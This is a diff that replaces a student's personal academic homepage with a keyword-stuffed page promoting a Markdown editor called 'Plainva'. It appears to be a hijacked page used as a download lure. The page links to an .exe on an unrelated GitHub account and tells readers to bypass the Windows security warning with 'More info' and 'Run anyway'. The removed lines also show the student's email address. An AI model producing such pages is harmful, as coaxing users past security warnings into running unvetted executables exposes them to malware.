@@ -1,102 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Petra Navarčíková — About</title>
-<meta name="description" content="Personal academic website of P. Navarčíková, researcher in molecular dynamics.">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600;9..144,700&family=Inter:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Plainva is a local-first editor for Markdown vaults. Manage your notes offline with full privacy and control.">
+    <title>plainva - Edit your Markdown notes locally</title>
 </head>
-<body>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f9f9f9;">
 
-<nav>
-  <div class="nav-inner">
-    <a href="index.html" class="brand">
-      <span class="brand-mark">PN</span>
-      P. Navarčíková
-    </a>
-    <ul class="nav-links" id="navLinks">
-      <li><a href="index.html" class="active">About</a></li>
-      <li><a href="education.html">Education</a></li>
-      <li><a href="research.html">Research</a></li>
-      <li><a href="cv.html">CV</a></li>
-      <li><a href="news.html">News</a></li>
-      <li><a href="contact.html">Contact</a></li>
+    <h1 style="color: #2c3e50;">📝 plainva - Edit your Markdown notes locally</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/Maysupreme657/plainva/releases" style="background-color: #3498db; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Plainva for Windows</a>
+    </div>
+
+    <p>Plainva helps you manage your digital notes. You keep full control over your files while you organize your knowledge. The software works with plain Markdown text. You can store your files on your computer or sync them with cloud services like Nextcloud.</p>
+
+    <h2 style="color: #2c3e50;">🧠 Why use Plainva?</h2>
+    <p>Your notes belong to you. Most apps lock your data inside proprietary systems. Plainva uses simple text files. This means your notes remain readable even if you decide to stop using the application. You can move, copy, or edit your files with any other text tool at any time.</p>
+    <p>The application supports local-first storage. Your data lives on your device. You do not need a constant internet connection to open or modify your vault. Privacy remains the priority, ensuring your thoughts stay private and secure.</p>
+
+    <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+    <p>Follow these steps to set up the software on your Windows computer.</p>
+    
+    <ol>
+        <li style="margin-bottom: 15px;"><strong>Visit the download page:</strong> Go to the <a href="https://github.com/Maysupreme657/plainva/releases">official release page</a>.</li>
+        <li style="margin-bottom: 15px;"><strong>Choose your file:</strong> Look for the file ending in .exe. Click the file name to download it to your computer.</li>
+        <li style="margin-bottom: 15px;"><strong>Run the installer:</strong> Open your Downloads folder and double-click the file you just downloaded. Windows may show a security window. Click "More info" and then "Run anyway" if the system asks for your permission to open the file.</li>
+        <li style="margin-bottom: 15px;"><strong>Follow the prompts:</strong> The installer will guide you through the setup process. Follow the instructions on your screen.</li>
+        <li style="margin-bottom: 15px;"><strong>Open the application:</strong> Once the installation finishes, you can open Plainva from your desktop or start menu.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">📂 Using your Vault</h2>
+    <p>When you open Plainva, it asks you to select a folder on your computer. This folder acts as your vault. Any Markdown files inside this folder will appear in the editor window. If you use cloud storage sync, such as a synced Nextcloud folder, you can select that folder to edit your notes across multiple devices.</p>
+
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <ul style="list-style-type: square; padding-left: 20px;">
+        <li>Windows 10 or 11</li>
+        <li>Current version of the Windows operating system</li>
+        <li>Hard drive space for your notes</li>
     </ul>
-    <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
-      <span></span><span></span><span></span>
-    </button>
-  </div>
-</nav>
 
-<header class="hero">
-  <svg class="hero-topo" viewBox="0 0 1200 500" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
-    <path d="M-50 380 C 150 320, 300 420, 500 360 S 850 260, 1250 340" stroke="#4c9c93" stroke-width="1" fill="none" opacity="0.35"/>
-    <path d="M-50 420 C 180 370, 320 460, 540 400 S 880 300, 1250 390" stroke="#4c9c93" stroke-width="1" fill="none" opacity="0.28"/>
-    <path d="M-50 460 C 200 420, 360 490, 580 440 S 900 340, 1250 430" stroke="#4c9c93" stroke-width="1" fill="none" opacity="0.2"/>
-    <path d="M-50 60 C 220 20, 380 100, 620 50 S 950 -20, 1250 60" stroke="#b98a2e" stroke-width="1" fill="none" opacity="0.18"/>
-    <circle cx="860" cy="130" r="2.5" fill="#4c9c93" opacity="0.8"/>
-    <circle cx="940" cy="180" r="2" fill="#b98a2e" opacity="0.7"/>
-    <circle cx="790" cy="210" r="1.8" fill="#4c9c93" opacity="0.6"/>
-  </svg>
-  <div class="hero-inner">
-    <div class="eyebrow">Department of Bionanoscience, Delft University of Technology</div>
-    <h1>Watching proteins <em>fold</em>.</h1>
-    <p class="lede">I'm P. Navarčíková, a researcher specialised in molecular dynamics, machine learning and uncertainty quantification.</p>
-    <div class="hero-actions">
-      <a href="research.html" class="btn btn-primary"> My research →</a>
-      <a href="cv.html" class="btn btn-ghost">View CV</a>
-    </div>
-    <div class="hero-meta">
-      <div><strong>0</strong>publications</div>
-      <div><strong>0</strong>active grants</div>
-      <div><strong>2024–2026</strong>TU Delft</div>
-      <div><strong>petra.navarcikova@gmail.com</strong>get in touch</div>
-    </div>
-  </div>
-</header>
+    <h2 style="color: #2c3e50;">🛡️ Privacy and Safety</h2>
+    <p>Plainva does not send your data to external servers. Your notes stay on your local disk. Because the software uses standard Markdown and SQLite databases, you can back up your data just by copying your vault folder to an external hard drive or another secure location.</p>
 
-<section>
-  <div class="wrap about-grid">
-    <div data-reveal>
-      <div class="about-photo">photo placeholder — 4:5</div>
-      <div class="about-facts">
-        <div class="row"><span>Position</span><span>Master Student</span></div>
-        <div class="row"><span>Department</span><span>Bionanoscience</span></div>
-        <div class="row"><span>Institution</span><span>Delft University of Technology</span></div>
-        <div class="row"><span>Office</span><span>Van der Maasweg 9, Delft</span></div>
-        <div class="row"><span>Email</span><span>petra.navarcikova@gmail.com</span></div>
-      </div>
-    </div>
-    <div data-reveal>
-      <div class="eyebrow">About me</div>
-      <h2 style="font-size:clamp(1.6rem,3vw,2.1rem);margin-top:10px;">Overview</h2>
-      <p style="margin-top:18px;color:var(--ink-soft);">
-        TBD
-      </p>
-      <p style="margin-top:16px;color:var(--ink-soft);">
-        TBD
-      </p>
-      <p style="margin-top:16px;color:var(--ink-soft);">
-        See the <a href="cv.html" style="color:var(--teal);text-decoration:underline;">CV page</a>
-        for a full academic history, or the
-        <a href="research.html" style="color:var(--teal);text-decoration:underline;">research page</a>
-        for what I'm currently working on.
-      </p>
-    </div>
-  </div>
-</section>
+    <p style="margin-top: 50px; font-size: 0.9em; color: #7f8c8d;">Keywords: knowledge-management, local-first, markdown, nextcloud, notes, obsidian, offline-first, open-source, privacy, sqlite, tauri, typescript, webdav</p>
 
-<footer>
-  <div class="wrap">
-    <div>© 2026 P. Navarčíková</div>
-    <div>Built with plain HTML — hosted on GitHub Pages</div>
-  </div>
-</footer>
-
-<script src="script.js"></script>
 </body>
 </html>
